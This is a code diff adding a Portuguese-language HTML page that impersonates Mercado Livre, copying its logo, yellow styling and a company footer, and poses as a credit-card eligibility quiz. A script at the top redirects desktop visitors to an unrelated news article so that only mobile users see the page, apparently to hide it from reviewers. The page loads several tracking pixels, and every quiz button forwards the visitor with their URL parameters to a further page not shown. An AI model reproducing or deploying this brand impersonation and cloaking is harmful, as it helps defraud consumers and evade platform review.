@@ -1,0 +1,183 @@
+﻿<html lang="pt-BR">
+
+<head>
+ 
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link href="css2-4.html" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min-3.css">
+  <title>Análise de Cartão</title>
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      color: white;
+      text-align: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .header img {
+      width: 125px;
+      padding: 10px;
+    }
+
+    .logo {
+      margin-left: 20px;
+    }
+
+    .content {
+      padding: 20px;
+    }
+
+    .quiz-container {
+      margin: 0 auto;
+      padding: 20px;
+      margin: 0px 15px;
+      border-radius: 10px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+    }
+
+    .quiz-question {
+      font-family: 'Sora', sans-serif;
+      font-size: 20px;
+      text-align: left;
+      margin-bottom: 20px;
+      margin-top: 0px;
+      color: #1c1c1c;
+    }
+
+    .quiz-option {
+      background-color: #FFE600;
+      color: #1c1c1c;
+      padding: 15px;
+      margin: 5px 0;
+      border-radius: 10px;
+      text-align: center;
+      cursor: pointer;
+      font-family: 'Sora', sans-serif;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    .quiz-option:hover {
+      background-color: #e6cf00;
+    }
+  </style>
+
+
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+    window.pixelId = "6903840b1d5bdac30702fe0f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="quiz-container">
+    <h2 class="quiz-question">Qual é o seu interesse com um Cartão de Crédito hoje?</h2>
+
+    <button class="quiz-option">Fazer uma compra específica</button>
+    <button class="quiz-option">Fazer uma viagem</button>
+    <button class="quiz-option">Poder gastar mais</button>
+    <button class="quiz-option">Organizar a meu financeiro</button>
+    <button class="quiz-option">Outros</button>
+  </div>
+
+  <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto;">
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+      </p>
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+      </p>
+      <p style="color: #999; font-size: 9px; margin-top: 5px;">
+        © 2025 - Todos os direitos reservados
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    // Função para obter parâmetros da URL
+    function getUrlParams() {
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of urlParams) {
+        params[key] = value;
+      }
+      return params;
+    }
+
+    // Função para construir URL com os parâmetros
+    function buildUrlWithParams(baseUrl) {
+      const fullUrl = new URL(baseUrl, window.location.origin);
+      const params = getUrlParams();
+
+      Object.keys(params).forEach(key => {
+        fullUrl.searchParams.append(key, params[key]);
+      });
+
+      return fullUrl.toString();
+    }
+
+    // Adiciona evento de clique nos botões
+    document.addEventListener('DOMContentLoaded', function () {
+      const buttons = document.querySelectorAll('.quiz-option');
+      buttons.forEach(button => {
+        button.addEventListener('click', function (e) {
+          e.preventDefault();
+          const finalUrl = buildUrlWithParams('online/6/index.html');
+          window.location.href = finalUrl + window.location.search;
+        });
+      });
+    });
+  </script>
+
+
+</body>
+
+</html>
